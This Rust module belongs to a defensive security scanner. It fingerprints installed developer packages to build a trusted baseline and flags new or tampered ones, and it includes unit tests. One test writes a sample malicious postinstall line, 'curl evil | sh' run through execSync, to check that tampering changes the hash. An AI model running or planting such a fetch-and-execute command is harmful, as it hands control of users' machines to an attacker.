//! Trusted-package baseline for the security scan (baseline + diff model).
//!
//! The vendored antivirus scanner was built to vet ONE untrusted package.
//! Legitimate developer toolchains (npm, pip, editor extensions) genuinely
//! contain the capabilities it detects — reading `.npmrc`, dynamic exec,
//! clipboard access — so a raw scan of a real dev machine cries wolf. This
//! module implements the fix: the first scan records every installed
//! package's identity and content fingerprint as the trusted baseline; later
//! scans surface only packages that are NEW, UPDATED (version bump + content
//! change), or CHANGED WITHOUT A VERSION BUMP (the worm-injection signature).
//! Byte-identical known packages are suppressed regardless of their raw AV
//! verdict.
//!
//! The baseline lives at `~/.config/cleanton/security_baseline.json`
//! (versioned schema, atomic temp-file+rename writes — the same pattern as
//! `cleanton_common::usage_history`). `~/.config/cleanton` is inside the
//! safety floor, so the baseline file itself can never be scanned or cleaned.
//!
//! POLICY: the baseline is metadata ABOUT packages. Recording, reviewing, or
//! re-establishing a baseline writes only this file — it never touches a
//! package, and nothing in this module removes or modifies anything.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::time::SystemTime;

use cleanton_common::{CleantonError, Result};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use crate::security::SecurityTargetKind;

/// Bump when the on-disk baseline layout changes incompatibly. A file with a
/// newer schema than we understand is treated as absent (the scan then
/// re-establishes a baseline rather than mis-reading it).
pub const BASELINE_SCHEMA_VERSION: u32 = 1;

/// One trusted package as recorded in the baseline.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct BaselineEntry {
    /// Version parsed from the package manifest at record time, if any.
    pub version: Option<String>,
    /// Content fingerprint at record time (see [`fingerprint_package`]).
    pub fingerprint: String,
    /// When this identity first entered the baseline.
    pub first_seen: SystemTime,
    /// When the user last explicitly marked the package reviewed/trusted
    /// (`None` for entries recorded automatically at baseline establishment).
    #[serde(default)]
    pub last_reviewed: Option<SystemTime>,
    /// The AV verdict label ("clean" / "suspicious" / "malicious") observed
    /// when this entry was recorded — kept for the audit trail.
    pub verdict_at_baseline: String,
}

/// The persisted trusted-package set, keyed by [`identity_key`].
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct SecurityBaseline {
    pub schema_version: u32,
    /// Package identity key → trusted state. `BTreeMap` keeps the file diff-
    /// friendly (stable ordering across writes).
    #[serde(default)]
    pub entries: BTreeMap<String, BaselineEntry>,
}

impl Default for SecurityBaseline {
    fn default() -> Self {
        Self {
            schema_version: BASELINE_SCHEMA_VERSION,
            entries: BTreeMap::new(),
        }
    }
}

impl SecurityBaseline {
    /// Number of trusted entries.
    #[must_use]
    pub fn len(&self) -> usize {
        self.entries.len()
    }

    /// `true` when no baseline has been established yet.
    #[must_use]
    pub fn is_empty(&self) -> bool {
        self.entries.is_empty()
    }
}

/// Stable identity key for a package: `{source}:{name}`. Two packages with
/// the same name in different tree kinds (a global npm `foo` vs a project
/// `foo`) are distinct identities.
#[must_use]
pub fn identity_key(source: SecurityTargetKind, name: &str) -> String {
    let source_key = match source {
        SecurityTargetKind::NodeGlobal => "node_global",
        SecurityTargetKind::NodeProject => "node_project",
        SecurityTargetKind::PythonSitePackages => "python_site_packages",
        SecurityTargetKind::EditorExtensions => "editor_extensions",
        SecurityTargetKind::RubyGems => "ruby_gems",
        SecurityTargetKind::CargoRegistry => "cargo_registry",
        SecurityTargetKind::GoModuleCache => "go_module_cache",
        // A persistence file's identity is its own name (`.zshrc`, a launchd
        // label), which is already unique on a machine, so it needs no prefix
        // of its own beyond the shared source tag.
        SecurityTargetKind::HostPersistence => "host_persistence",
    };
    format!("{source_key}:{name}")
}

/// Default on-disk location for the baseline
/// (`$HOME/.config/cleanton/security_baseline.json`). Returns `None` if
/// `$HOME` is unset; callers then run without baseline persistence.
#[must_use]
pub fn default_baseline_path() -> Option<PathBuf> {
    std::env::var_os("HOME")
        .filter(|home| !home.is_empty())
        .map(|home| {
            PathBuf::from(home)
                .join(".config")
                .join("cleanton")
                .join("security_baseline.json")
        })
}

/// Loads the baseline from `path`. A missing, corrupt, or newer-schema file
/// yields an empty baseline (the next scan then re-establishes one and says
/// so) — this function never returns an error.
#[must_use]
pub fn load(path: &Path) -> SecurityBaseline {
    let bytes = match std::fs::read(path) {
        Ok(bytes) => bytes,
        Err(err) if err.kind() == std::io::ErrorKind::NotFound => {
            return SecurityBaseline::default();
        }
        Err(err) => {
            tracing::warn!("could not read security baseline {}: {err}", path.display());
            return SecurityBaseline::default();
        }
    };
    match serde_json::from_slice::<SecurityBaseline>(&bytes) {
        Ok(baseline) if baseline.schema_version <= BASELINE_SCHEMA_VERSION => baseline,
        Ok(baseline) => {
            tracing::warn!(
                "security baseline {} has newer schema {} (supported {}); treating as absent",
                path.display(),
                baseline.schema_version,
                BASELINE_SCHEMA_VERSION
            );
            SecurityBaseline::default()
        }
        Err(err) => {
            tracing::warn!(
                "ignoring corrupt security baseline {}: {err}",
                path.display()
            );
            SecurityBaseline::default()
        }
    }
}

/// Atomically serializes `baseline` to `path` (sibling temp file + rename),
/// creating the parent directory if needed.
///
/// # Errors
///
/// Returns [`CleantonError::Io`] on directory-creation, serialization, write,
/// or rename failure.
pub fn save(path: &Path, baseline: &SecurityBaseline) -> Result<()> {
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent).map_err(|err| CleantonError::io(parent, err))?;
    }
    let json = serde_json::to_vec_pretty(baseline).map_err(|err| {
        CleantonError::io(
            path,
            std::io::Error::new(std::io::ErrorKind::InvalidData, err),
        )
    })?;
    let tmp = path.with_extension("json.tmp");
    std::fs::write(&tmp, &json).map_err(|err| CleantonError::io(&tmp, err))?;
    std::fs::rename(&tmp, path).map_err(|err| CleantonError::io(path, err))?;
    Ok(())
}

// ── Content fingerprint ──────────────────────────────────────────────────────

/// SHA-256 fingerprint of a package's security-relevant surface.
///
/// The walk visits the package tree in sorted order and feeds, per regular
/// file, its package-relative path, a NUL separator, the SHA-256 of its full
/// contents, and a trailing NUL into the outer hash. Because every shipped
/// file is covered, this includes the manifest (`package.json`, `METADATA`,
/// …), every lifecycle/install script (npm `preinstall`/`install`/
/// `postinstall` targets, `.py` entry points), and all package code — ANY
/// byte change to the package's own files yields a different fingerprint,
/// which is exactly what makes a same-version tamper visible.
///
/// Excluded, by design, so the fingerprint is stable and fast:
/// - nested `node_modules` directories (dependencies are separate packages
///   with their own identity; including them would churn the hash on every
///   dependency install),
/// - `__pycache__` directories and `*.pyc` files (recompiled locally,
///   nondeterministic),
/// - `.git` directories,
/// - symlinks (never followed — a symlink's target lives outside the
///   package).
///
/// A single-file package (a lone `site-packages/module.py`) hashes that file.
///
/// # Errors
///
/// Returns the first I/O error hit while walking or reading package files.
/// Callers must treat a failed fingerprint as "cannot verify" — the package
/// is surfaced for review, never silently trusted.
pub fn fingerprint_package(path: &Path) -> std::io::Result<String> {
    let mut hasher = Sha256::new();
    if path.is_file() {
        let name = path
            .file_name()
            .map(|n| n.to_string_lossy().into_owned())
            .unwrap_or_default();
        hash_file_record(&mut hasher, &name, path)?;
        return Ok(to_hex(&hasher.finalize()));
    }

    let walker = walkdir::WalkDir::new(path)
        .follow_links(false)
        .sort_by_file_name()
        .into_iter()
        .filter_entry(|entry| {
            if entry.depth() == 0 {
                return true;
            }
            if !entry.file_type().is_dir() {
                return true;
            }
            let name = entry.file_name().to_string_lossy();
            name != "node_modules" && name != "__pycache__" && name != ".git"
        });
    for entry in walker {
        let entry = entry.map_err(std::io::Error::from)?;
        if !entry.file_type().is_file() {
            continue;
        }
        if entry.file_name().to_string_lossy().ends_with(".pyc") {
            continue;
        }
        let rel = entry.path().strip_prefix(path).map_or_else(
            |_| entry.path().to_string_lossy().into_owned(),
            |rel| rel.to_string_lossy().into_owned(),
        );
        hash_file_record(&mut hasher, &rel, entry.path())?;
    }
    Ok(to_hex(&hasher.finalize()))
}

/// Lowercase hex encoding of a digest. `sha2` 0.11 digests no longer
/// implement `LowerHex`, so format the bytes explicitly.
fn to_hex(bytes: &[u8]) -> String {
    use std::fmt::Write as _;
    bytes
        .iter()
        .fold(String::with_capacity(bytes.len() * 2), |mut out, b| {
            let _ = write!(out, "{b:02x}");
            out
        })
}

/// Feed one file record (relative path + content hash, NUL-delimited) into
/// the package hasher. Content is streamed, never fully buffered.
fn hash_file_record(hasher: &mut Sha256, rel: &str, file: &Path) -> std::io::Result<()> {
    let mut content = Sha256::new();
    // `sha2` 0.11 hashers no longer implement `std::io::Write`, so stream
    // through a buffered reader instead of `std::io::copy`.
    let mut reader = std::io::BufReader::with_capacity(64 * 1024, std::fs::File::open(file)?);
    loop {
        let chunk = std::io::BufRead::fill_buf(&mut reader)?;
        if chunk.is_empty() {
            break;
        }
        content.update(chunk);
        let consumed = chunk.len();
        std::io::BufRead::consume(&mut reader, consumed);
    }
    hasher.update(rel.as_bytes());
    hasher.update([0u8]);
    hasher.update(content.finalize());
    hasher.update([0u8]);
    Ok(())
}

#[cfg(test)]
mod tests {
    #![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

    use super::*;

    fn write(path: &Path, contents: &str) {
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent).unwrap();
        }
        std::fs::write(path, contents).unwrap();
    }

    fn make_package(dir: &Path) {
        write(
            &dir.join("package.json"),
            r#"{ "name": "pkg", "version": "1.0.0", "scripts": { "postinstall": "node setup.js" } }"#,
        );
        write(&dir.join("setup.js"), "console.log('hello');\n");
        write(&dir.join("lib/index.js"), "module.exports = 1;\n");
    }

    #[test]
    fn fingerprint_is_stable_for_identical_trees() {
        let tmp = tempfile::tempdir().unwrap();
        let a = tmp.path().join("a/pkg");
        let b = tmp.path().join("b/pkg");
        make_package(&a);
        make_package(&b);
        let fp_a = fingerprint_package(&a).unwrap();
        let fp_b = fingerprint_package(&b).unwrap();
        assert_eq!(fp_a, fp_b, "same content in a different location matches");
        assert_eq!(fp_a, fingerprint_package(&a).unwrap(), "re-run is stable");
    }

    #[test]
    fn fingerprint_changes_when_install_script_changes() {
        let tmp = tempfile::tempdir().unwrap();
        let dir = tmp.path().join("pkg");
        make_package(&dir);
        let before = fingerprint_package(&dir).unwrap();
        // Tamper with the postinstall payload — no version bump anywhere.
        write(
            &dir.join("setup.js"),
            "require('child_process').execSync('curl evil | sh');\n",
        );
        let after = fingerprint_package(&dir).unwrap();
        assert_ne!(before, after, "a changed install script changes the hash");
    }

    #[test]
    fn fingerprint_ignores_nested_node_modules_and_pycache() {
        let tmp = tempfile::tempdir().unwrap();
        let dir = tmp.path().join("pkg");
        make_package(&dir);
        let before = fingerprint_package(&dir).unwrap();
        // Installing dependencies or byte-compiling must not churn the hash.
        write(
            &dir.join("node_modules/dep/package.json"),
            r#"{ "name": "dep" }"#,
        );
        write(&dir.join("__pycache__/mod.cpython-312.pyc"), "cafebabe");
        write(&dir.join("cached.pyc"), "cafebabe");
        let after = fingerprint_package(&dir).unwrap();
        assert_eq!(before, after);
    }

    #[test]
    fn fingerprint_covers_single_file_packages() {
        let tmp = tempfile::tempdir().unwrap();
        let module = tmp.path().join("six_like.py");
        write(&module, "PY3 = True\n");
        let before = fingerprint_package(&module).unwrap();
        write(&module, "PY3 = False\n");
        assert_ne!(before, fingerprint_package(&module).unwrap());
    }

    #[test]
    fn baseline_round_trips_and_tolerates_corruption() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("security_baseline.json");
        assert!(load(&path).is_empty(), "missing file is an empty baseline");

        let mut baseline = SecurityBaseline::default();
        baseline.entries.insert(
            identity_key(SecurityTargetKind::NodeGlobal, "npm"),
            BaselineEntry {
                version: Some("10.0.0".to_owned()),
                fingerprint: "abc123".to_owned(),
                first_seen: SystemTime::UNIX_EPOCH,
                last_reviewed: None,
                verdict_at_baseline: "malicious".to_owned(),
            },
        );
        save(&path, &baseline).unwrap();
        assert_eq!(load(&path), baseline);

        std::fs::write(&path, b"{not json").unwrap();
        assert!(load(&path).is_empty(), "corrupt file is treated as absent");
    }

    #[test]
    fn newer_schema_is_treated_as_absent() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("security_baseline.json");
        std::fs::write(&path, br#"{ "schema_version": 999, "entries": {} }"#).unwrap();
        assert!(load(&path).is_empty());
    }

    #[test]
    fn identity_keys_distinguish_sources() {
        assert_ne!(
            identity_key(SecurityTargetKind::NodeGlobal, "foo"),
            identity_key(SecurityTargetKind::NodeProject, "foo")
        );
        assert_eq!(
            identity_key(SecurityTargetKind::PythonSitePackages, "requests"),
            "python_site_packages:requests"
        );
    }
}
